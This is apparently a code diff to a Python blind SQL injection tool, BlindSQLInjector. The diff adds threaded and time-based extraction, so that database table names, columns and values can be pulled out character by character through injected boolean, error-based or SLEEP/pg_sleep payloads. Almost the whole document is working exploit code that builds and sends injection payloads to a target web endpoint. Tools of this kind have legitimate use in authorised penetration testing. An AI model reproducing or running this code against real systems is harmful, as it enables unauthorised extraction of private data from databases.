@@ -182,7 +182,8 @@ class BlindSQLInjector:
                  case_sensitive=False, encoding="none",
                  custom_template=None, invert_indicator=False,
                  where_clause=None,
-                 enum_tables_override=None, enum_columns_override=None):
+                 enum_tables_override=None, enum_columns_override=None,
+                 threads=1, time_delay=5):
         self.raw_request = raw_request
         self.injection_point = injection_point
         self.injection_type = (injection_type or "boolean").lower()
@@ -191,8 +192,15 @@ class BlindSQLInjector:
         self.task = logger or _PrintLogger()
         self.stop_event = stop_event
         self.session = self._create_session()
-        self.delay = 4            # seconds for time-based threshold trigger
-        self.time_threshold = 3.0  # measured seconds above which = TRUE
+        # Time-based delay is user-set to match the template's SLEEP (pg_sleep(5),
+        # SLEEP(10), WAITFOR DELAY '0:0:10', etc.). The detection threshold derives
+        # from it: ~60% of the delay — high enough that network latency can't false
+        # -trigger, low enough that a real sleep clearly crosses it.
+        try:
+            self.delay = max(1, int(time_delay))
+        except (TypeError, ValueError):
+            self.delay = 5
+        self.time_threshold = max(1.5, self.delay * 0.6)
         self.results = []
         # resolved after detection
         self._dialect_name = None if self.database_type == "auto" else self.database_type
@@ -220,6 +228,15 @@ class BlindSQLInjector:
         # parsed list directly (the route parses the UI text into this shape).
         self.enum_tables_override = enum_tables_override or None
         self.enum_columns_override = enum_columns_override or None
+
+        # Parallelism. 1 = fully sequential (default, safe). For boolean/error we
+        # parallelize character POSITIONS (each position's binary search runs in
+        # its own thread). For time-based we test candidate characters per position
+        # across threads and take the slow responder, with an ambiguity re-check.
+        try:
+            self.threads = max(1, int(threads))
+        except (TypeError, ValueError):
+            self.threads = 1
 
         # Custom payload template: a string containing "{1}" where the tool drops
         # the generated boolean condition. Empty/None → use built-in wrapping.
@@ -270,6 +287,11 @@ class BlindSQLInjector:
         s.mount("http://", adapter)
         s.mount("https://", adapter)
         return s
+
+    # Each worker thread gets its own session (requests.Session isn't reliably
+    # safe for concurrent use). Same transparent config as the main session.
+    def _new_session(self):
+        return self._create_session()
 
     def _check_stop(self):
         if self.stop_event is not None and self.stop_event.is_set():
@@ -422,17 +444,18 @@ class BlindSQLInjector:
         self.log(f"[!] unknown encoding '{enc}', sending raw")
         return payload
 
-    def _send(self, payload):
+    def _send(self, payload, session=None):
         self._check_stop()
         payload = self._encode_payload(payload)
 
         if self._has_marker:
-            # Replace the FIRST §...§ span with (original marked text + payload).
-            # Everything else in the request is left exactly as the user typed it.
+            # REPLACE the FIRST §...§ span with the payload (Burp Intruder model):
+            # the marked text is removed and the payload takes its place exactly.
+            # If the injection needs the original value, include it in the template.
             pattern = re.escape(self.MARKER) + r"(.*?)" + re.escape(self.MARKER)
             raw_filled = re.sub(
                 pattern,
-                lambda m: m.group(1) + payload,
+                lambda m: payload,
                 self.raw_request,
                 count=1,
                 flags=re.DOTALL,
@@ -455,10 +478,11 @@ class BlindSQLInjector:
         else:
             req_timeout = 20
 
+        sess = session or self.session
         start = time.time()
         # Use the request's actual method (GET, POST, PUT, PATCH, DELETE, HEAD…)
         # so detection isn't limited to GET/POST endpoints.
-        resp = self.session.request(
+        resp = sess.request(
             method.upper(), url,
             headers=clean,
             data=(body.encode() if body else None),
@@ -468,7 +492,7 @@ class BlindSQLInjector:
         )
         return resp, (time.time() - start)
 
-    def _is_true(self, payload):
+    def _is_true(self, payload, session=None):
         """Boolean/error: true_indicator present in status+headers+body.
         Time: response delayed beyond threshold.
 
@@ -479,14 +503,14 @@ class BlindSQLInjector:
         try:
             if self.injection_type == "time":
                 try:
-                    _, elapsed = self._send(payload)
+                    _, elapsed = self._send(payload, session=session)
                     return elapsed >= self.time_threshold
                 except requests.exceptions.ReadTimeout:
                     # A read timeout in time-based mode usually means the SLEEP
                     # fired and held the connection past our timeout — i.e. TRUE.
                     self.log("[*] read timeout during time-based probe — treating as TRUE (SLEEP fired)")
                     return True
-            resp, _ = self._send(payload)
+            resp, _ = self._send(payload, session=session)
 
             # Build a searchable blob: "HTTP <status> <reason>" + headers + body.
             reason = getattr(resp, "reason", "") or ""
@@ -658,16 +682,166 @@ class BlindSQLInjector:
 
     # ── flat candidate enumeration ──────────────────────────────────────────────
     def _enum_cond_payload(self, condition, from_clause):
-        """Build a full injection payload for FLAT enumeration: the dialect's
-        error/boolean wrapper with {cond} and the candidate's {from}. Falls back to
-        the user custom_template only if the dialect has no error_case."""
+        """Build a full injection payload for FLAT enumeration.
+
+        Priority:
+        1. If a custom template is set, USE IT — the condition is made
+           self-contained by folding the candidate's FROM into a scalar subquery,
+           so the user's template (boolean / error / TIME-BASED pg_sleep / etc.)
+           drives detection. This is what makes time-based enumeration work.
+        2. Else if the dialect has an error_case wrapper, use that with the
+           candidate's flat {from}.
+        3. Else fall back to a plain scalar-subquery boolean condition.
+        """
         d = self._dialect()
+
+        # (1) Custom template wins. Fold FROM into the condition as a scalar
+        # subquery so the template stays generic. e.g. condition "LENGTH(col)>0"
+        # with from "FROM user_tables WHERE ROWNUM=1" becomes
+        # "(SELECT LENGTH(col) FROM user_tables WHERE ROWNUM=1)>0".
+        if self.custom_template:
+            self_contained = self._fold_from_into_condition(condition, from_clause)
+            return self._cond_payload(self_contained)
+
         ec = d.get("error_case")
         if ec:
             return ec.replace("{cond}", condition).replace("{from}", from_clause)
-        # No error wrapper (e.g. sqlite) — fold the FROM into a scalar subquery and
-        # use the normal cond payload (boolean-response style).
-        return self._cond_payload(condition)
+        return self._cond_payload(self._fold_from_into_condition(condition, from_clause))
+
+    @staticmethod
+    def _fold_from_into_condition(condition, from_clause):
+        """Turn 'EXPR<op>VALUE' + 'FROM ... WHERE ...' into
+        '(SELECT EXPR FROM ... WHERE ...)<op>VALUE' so the comparison is a
+        self-contained scalar that any generic template can wrap.
+        Splits on the comparison operator (>=, <=, >, <, =)."""
+        import re as _re
+        m = _re.match(r"^(.*?)(>=|<=|<>|!=|>|<|=)(.*)$", condition.strip())
+        if not m:
+            # no operator found — wrap whole thing
+            frm = from_clause if from_clause.lstrip().upper().startswith("FROM") else f"FROM {from_clause}"
+            return f"(SELECT {condition} {frm})"
+        left, op, right = m.group(1).strip(), m.group(2), m.group(3).strip()
+        frm = from_clause if from_clause.lstrip().upper().startswith("FROM") else f"FROM {from_clause}"
+        return f"(SELECT {left} {frm}){op}{right}"
+
+    # ── unified character extraction (sequential + parallel) ────────────────────
+    def _is_true_isolated(self, payload):
+        """Like _is_true but uses a fresh Session — safe to call from worker threads
+        (requests.Session is not reliably thread-safe for concurrent requests)."""
+        sess = self._new_session()
+        try:
+            return self._is_true(payload, session=sess)
+        finally:
+            try:
+                sess.close()
+            except Exception:
+                pass
+
+    def _find_length(self, payload_for, max_length):
+        """Binary-search the length using payload_for('len', op, n)."""
+        lo, hi = 0, max_length
+        while lo < hi:
+            self._check_stop()
+            mid = (lo + hi + 1) // 2
+            if self._is_true(payload_for('len', '>=', mid)):
+                lo = mid
+            else:
+                hi = mid - 1
+        return lo
+
+    def _extract_chars(self, payload_for, n):
+        """Extract n characters. payload_for('char', pos, ('>',val)) builds the probe.
+        Dispatches by mode/threads:
+          • threads==1: sequential binary search (original behaviour)
+          • boolean/error + threads>1: each POSITION binary-searched in its own thread
+          • time + threads>1: per position, candidate chars tested across threads;
+            the slow responder wins; ambiguous positions re-checked single-threaded.
+        """
+        if self.threads <= 1:
+            return self._extract_chars_seq(payload_for, n)
+        if self.injection_type == "time":
+            return self._extract_chars_time_parallel(payload_for, n)
+        return self._extract_chars_bool_parallel(payload_for, n)
+
+    def _char_binary_search(self, payload_for, pos, is_true_fn):
+        """Binary-search one character position's ASCII value. is_true_fn lets the
+        caller inject an isolated-session tester for thread workers."""
+        a, b = 32, 126
+        while a < b:
+            self._check_stop()
+            mid = (a + b) // 2
+            if is_true_fn(payload_for('char', pos, ('>', mid))):
+                a = mid + 1
+            else:
+                b = mid
+        return chr(a)
+
+    def _extract_chars_seq(self, payload_for, n):
+        out = []
+        for pos in range(1, n + 1):
+            self._check_stop()
+            ch = self._char_binary_search(payload_for, pos, self._is_true)
+            out.append(ch)
+            cur = "".join(out)
+            self.log(f"    [{pos}/{n}] {cur}")
+            self.results.append({"pos": pos, "char": ch, "result": cur})
+        return "".join(out)
+
+    def _extract_chars_bool_parallel(self, payload_for, n):
+        from concurrent.futures import ThreadPoolExecutor
+        results = [None] * n
+        self.log(f"    extracting {n} chars across {self.threads} threads (boolean)...")
+
+        def work(pos):
+            return pos, self._char_binary_search(payload_for, pos, self._is_true_isolated)
+
+        with ThreadPoolExecutor(max_workers=self.threads) as ex:
+            futures = [ex.submit(work, p) for p in range(1, n + 1)]
+            for fut in futures:
+                self._check_stop()
+                pos, ch = fut.result()
+                results[pos - 1] = ch
+        val = "".join(c or "?" for c in results)
+        self.log(f"    [done] {val}")
+        for i, c in enumerate(results, 1):
+            self.results.append({"pos": i, "char": c, "result": val})
+        return val
+
+    def _extract_chars_time_parallel(self, payload_for, n):
+        """Time-based: per position, test every printable char with ONE request each,
+        spread across threads. The char whose request is 'slow' (sleep fired) is the
+        hit. If a position yields zero or multiple slow hits (ambiguous under load),
+        re-test that position single-threaded with a binary search."""
+        from concurrent.futures import ThreadPoolExecutor
+        charset = [chr(c) for c in range(32, 127)]
+        out = [None] * n
+        self.log(f"    time-based: {self.threads} threads, full ASCII per position...")
+
+        for pos in range(1, n + 1):
+            self._check_stop()
+            hits = []
+
+            def probe(ch):
+                # equality test: SUBSTR(...,pos,1) = 'ch'  -> sleep if true
+                payload = payload_for('char_eq', pos, ('=', ch))
+                return ch, self._is_true_isolated(payload)
+
+            with ThreadPoolExecutor(max_workers=self.threads) as ex:
+                for ch, slow in ex.map(probe, charset):
+                    if slow:
+                        hits.append(ch)
+
+            if len(hits) == 1:
+                out[pos - 1] = hits[0]
+            else:
+                # ambiguous (0 or >1 slow) — load skew. Re-check this position
+                # sequentially with a binary search for reliability.
+                self.log(f"    [{pos}] ambiguous ({len(hits)} hits) — re-checking single-thread")
+                out[pos - 1] = self._char_binary_search(payload_for, pos, self._is_true)
+            cur = "".join(c or "?" for c in out[:pos])
+            self.log(f"    [{pos}/{n}] {cur}")
+            self.results.append({"pos": pos, "char": out[pos - 1], "result": cur})
+        return "".join(c or "?" for c in out)
 
     def _validate_candidate(self, col, from_clause):
         """Your idea: a candidate query shape is trusted only if LENGTH(col)>0 reads
@@ -685,40 +859,30 @@ class BlindSQLInjector:
             return False
 
     def _extract_flat_enum(self, col, from_clause, max_length=128):
-        """Length-first + per-char binary search for a value referenced by the bare
-        expression `col`, with `from_clause` supplying the FROM/WHERE context."""
+        """Length-first + per-char extraction for a value referenced by the bare
+        expression `col`, with `from_clause` supplying the FROM/WHERE context.
+        Uses the unified engine (sequential or threaded per settings)."""
         d = self._dialect()
         length_expr = d["length"].format(q=col)
-        lo, hi = 0, max_length
-        while lo < hi:
-            self._check_stop()
-            mid = (lo + hi + 1) // 2
-            if self._is_true(self._enum_cond_payload(f"{length_expr}>={mid}", from_clause)):
-                lo = mid
-            else:
-                hi = mid - 1
-        n = lo
+
+        def payload_for(kind, a, b=None):
+            if kind == 'len':
+                op, val = a, b
+                return self._enum_cond_payload(f"{length_expr}{op}{val}", from_clause)
+            if kind == 'char':
+                pos, (op, val) = a, b
+                ax = d["ascii"].format(q=col, pos=pos)
+                return self._enum_cond_payload(f"{ax}{op}{val}", from_clause)
+            if kind == 'char_eq':
+                pos, (op, ch) = a, b
+                sx = d["substr"].format(q=col, pos=pos)
+                return self._enum_cond_payload(f"{sx}='{ch}'", from_clause)
+
+        n = self._find_length(payload_for, max_length)
         if n == 0:
             return ""
         self.log(f"    length = {n}")
-        out = []
-        for pos in range(1, n + 1):
-            self._check_stop()
-            ax = d["ascii"].format(q=col, pos=pos)
-            a, b = 32, 126
-            while a < b:
-                self._check_stop()
-                mid = (a + b) // 2
-                if self._is_true(self._enum_cond_payload(f"{ax}>{mid}", from_clause)):
-                    a = mid + 1
-                else:
-                    b = mid
-            ch = chr(a)
-            out.append(ch)
-            cur = "".join(out)
-            self.log(f"    [{pos}/{n}] {cur}")
-            self.results.append({"pos": pos, "char": ch, "result": cur})
-        return "".join(out)
+        return self._extract_chars(payload_for, n)
 
     def _pick_candidate(self, kind, tbl=None, candidates=None):
         """Walk candidate shapes for `kind` ('tables'|'columns'); return the first
@@ -830,43 +994,32 @@ class BlindSQLInjector:
 
     def _extract_scalar_subquery(self, column, table, where, row, max_length=128):
         """Length-first + per-char search where each condition is a self-contained
-        scalar subquery — no separate FROM/WHERE on the template."""
+        scalar subquery — no separate FROM/WHERE on the template. Uses the unified
+        engine (sequential or threaded per settings)."""
         d = self._dialect()
-        # LENGTH(column) and ASCII(SUBSTR(column,pos,1)) are computed INSIDE the
-        # subquery so only a single scalar comes back out.
-        len_inner = d["length"].format(q=column)
-        len_scalar = self._wrap_scalar(len_inner, table, where, row)
-        lo, hi = 0, max_length
-        while lo < hi:
-            self._check_stop()
-            mid = (lo + hi + 1) // 2
-            if self._is_true(self._cond_payload(f"{len_scalar}>={mid}")):
-                lo = mid
-            else:
-                hi = mid - 1
-        n = lo
+
+        def payload_for(kind, a, b=None):
+            if kind == 'len':
+                op, val = a, b
+                inner = d["length"].format(q=column)
+                scalar = self._wrap_scalar(inner, table, where, row)
+                return self._cond_payload(f"{scalar}{op}{val}")
+            if kind == 'char':
+                pos, (op, val) = a, b
+                inner = d["ascii"].format(q=column, pos=pos)
+                scalar = self._wrap_scalar(inner, table, where, row)
+                return self._cond_payload(f"{scalar}{op}{val}")
+            if kind == 'char_eq':
+                pos, (op, ch) = a, b
+                inner = d["substr"].format(q=column, pos=pos)
+                scalar = self._wrap_scalar(inner, table, where, row)
+                return self._cond_payload(f"{scalar}='{ch}'")
+
+        n = self._find_length(payload_for, max_length)
         if n == 0:
             return ""
         self.log(f"    length = {n}")
-        result = []
-        for pos in range(1, n + 1):
-            self._check_stop()
-            ascii_inner = d["ascii"].format(q=column, pos=pos)
-            ascii_scalar = self._wrap_scalar(ascii_inner, table, where, row)
-            a, b = 32, 126
-            while a < b:
-                self._check_stop()
-                mid = (a + b) // 2
-                if self._is_true(self._cond_payload(f"{ascii_scalar}>{mid}")):
-                    a = mid + 1
-                else:
-                    b = mid
-            ch = chr(a)
-            result.append(ch)
-            cur = "".join(result)
-            self.log(f"    [{pos}/{n}] {cur}")
-            self.results.append({"pos": pos, "char": ch, "result": cur})
-        return "".join(result)
+        return self._extract_chars(payload_for, n)
 
     # ── DIRECT flat extraction (no nested subquery) ──────────────────────────────
     def _extract_flat(self, expr, max_length=128):
